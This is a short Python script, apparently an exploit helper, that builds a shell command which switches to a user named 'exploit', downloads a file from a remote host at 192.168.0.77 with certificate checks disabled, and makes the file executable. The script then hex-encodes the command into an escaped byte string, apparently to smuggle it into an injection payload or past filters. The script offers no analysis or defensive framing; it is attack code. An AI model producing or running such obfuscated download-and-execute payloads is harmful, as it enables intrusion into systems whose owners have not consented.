# https://stackoverflow.com/questions/17093700/python-bytearray-printing

if __name__ == "__main__":

	command = "/bin/sh -c 'su - exploit -c \"curl -k -o /var/tmp/pkey.txt https://192.168.0.77:8080/key\"; chmod +x /var/tmp/pkey.txt'"
	encoded_command = command.encode('utf-8')
	hex_str = '\\\\'.join(hex(c) for c in encoded_command)
	final_str = "\\\\"
	for i in range(0, len(hex_str)):
		if i % 6 != 0:
			final_str += str(hex_str[i])
	print(final_str)
